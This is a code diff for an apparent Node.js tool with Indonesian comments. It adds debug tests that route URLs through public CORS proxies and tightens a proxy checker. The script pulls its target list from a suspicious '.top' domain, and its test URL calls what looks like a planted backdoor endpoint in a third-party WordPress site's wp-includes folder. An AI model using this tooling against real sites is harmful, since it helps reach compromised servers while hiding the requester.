@@ -7,24 +7,108 @@ const SOURCE_URL =
   process.env.SOURCE_URL ||
   "https://ampnyapunyaku.top/api/render-cyber-lockdown-image/node.txt";
 
+const DEBUG_MODE = process.env.DEBUG_MODE === "true";
+
 // PROXY CONFIGS DENGAN FALLBACK
 const PROXY_CONFIGS = [
   {
     url: process.env.PRIMARY_PROXY || "https://cors-anywhere-railway-production.up.railway.app",
     name: "Railway Proxy",
-    format: "double" // https://example.com
+    format: "double"
   },
   {
     url: process.env.SECONDARY_PROXY || "https://cors-anywhere-vercel-dzone.vercel.app",
     name: "Vercel Proxy",
-    format: "single" // https:/example.com
+    format: "single"
   },
   {
     url: "https://api.allorigins.win/raw?url=",
     name: "AllOrigins",
-    format: "encoded" // URL encoded
+    format: "encoded"
   }
 ];
+
+// ======================== DEBUG UTILITIES ===========================
+if (DEBUG_MODE) {
+  function testEncoding() {
+    console.log("\n🔍 === DEBUG: TESTING URL ENCODING ===");
+    
+    const testUrls = [
+      "https://example.com/api/data",
+      "https://tessa.cz/wp-includes/rss-functions.php?action=verify&key=sitecore&token=test123",
+      "https://api.example.com/v1/users?page=1&limit=10&sort=desc"
+    ];
+    
+    for (const url of testUrls) {
+      console.log(`\n📝 Original URL: ${url}`);
+      console.log(`🔢 Length: ${url.length} characters`);
+      
+      // Test encodeURIComponent
+      const encoded = encodeURIComponent(url);
+      console.log(`🔐 Encoded: ${encoded.substring(0, 80)}...`);
+      console.log(`📏 Encoded length: ${encoded.length} characters`);
+      
+      // Verifikasi encoding
+      console.log(`✅ Contains 'https%3A%2F%2F'? ${encoded.includes('https%3A%2F%2F')}`);
+      console.log(`✅ Contains '%3F' for '?'? ${encoded.includes('%3F')}`);
+      console.log(`✅ Contains '%26' for '&'? ${encoded.includes('%26')}`);
+      
+      // Test semua format proxy
+      console.log(`\n🔄 Testing proxy formats for: ${url.substring(0, 50)}...`);
+      
+      const testConfigs = [
+        { name: "Railway (double)", url: PROXY_CONFIGS[0].url, format: "double" },
+        { name: "Vercel (single)", url: PROXY_CONFIGS[1].url, format: "single" },
+        { name: "AllOrigins (encoded)", url: PROXY_CONFIGS[2].url, format: "encoded" }
+      ];
+      
+      for (const config of testConfigs) {
+        let proxyUrl;
+        if (config.format === "single") {
+          const cleanUrl = url.replace(/^https?:\/\//, '');
+          proxyUrl = `${config.url}/https:/${cleanUrl}`;
+          console.log(`   ${config.name}: ${proxyUrl.substring(0, 80)}...`);
+        } else if (config.format === "double") {
+          proxyUrl = `${config.url}/${url}`;
+          console.log(`   ${config.name}: ${proxyUrl.substring(0, 80)}...`);
+        } else if (config.format === "encoded") {
+          proxyUrl = `${config.url}${encodeURIComponent(url)}`;
+          console.log(`   ${config.name}: ${proxyUrl.substring(0, 80)}...`);
+        }
+      }
+    }
+    console.log("✅ === DEBUG: ENCODING TEST COMPLETE ===\n");
+  }
+  
+  // Jalankan test encoding
+  testEncoding();
+  
+  // Test juga fungsi buildProxyUrlWithFallback
+  function testProxyBuilder() {
+    console.log("\n🔧 === DEBUG: TESTING PROXY BUILDER FUNCTIONS ===");
+    
+    const testUrl = "https://tessa.cz/wp-includes/rss-functions.php?action=verify&key=sitecore";
+    
+    console.log(`Test URL: ${testUrl}`);
+    
+    // Simulasikan dengan setiap proxy sebagai aktif
+    for (let i = 0; i < PROXY_CONFIGS.length; i++) {
+      const originalIndex = activeProxyIndex;
+      activeProxyIndex = i;
+      
+      const result = buildProxyUrlWithFallback(testUrl);
+      console.log(`\n📡 Active proxy: ${result.config.name} (format: ${result.config.format})`);
+      console.log(`   Built URL: ${result.url.substring(0, 100)}...`);
+      console.log(`   URL length: ${result.url.length} chars`);
+      
+      activeProxyIndex = originalIndex;
+    }
+    
+    console.log("✅ === DEBUG: PROXY BUILDER TEST COMPLETE ===\n");
+  }
+  
+  testProxyBuilder();
+}
 
 // ======================== DATA STRUCTURE ===========================
 const clients = [];
@@ -154,23 +238,29 @@ const fetchText = async (url) => {
 };
 
 // ======================== PROXY TESTER ===========================
+
 async function testProxy(proxyUrl, originalUrl) {
   try {
     const response = await axios.get(proxyUrl, {
-      timeout: 3000,
-      validateStatus: () => true,
-      headers: { "User-Agent": "Mozilla/5.0" }
+      timeout: 10000, // Naikkan ke 10 detik
+      validateStatus: (status) => status === 200, // HANYA terima 200
+      headers: { 
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json"
+      }
     });
     
     return {
-      works: response.status < 500,
+      works: true, // Jika sampai sini, status sudah 200
       status: response.status,
-      url: proxyUrl
+      url: proxyUrl,
+      dataLength: response.data?.length || 0
     };
   } catch (err) {
     return { 
       works: false, 
       error: err.message,
+      status: err.response?.status || 0,
       url: proxyUrl
     };
   }
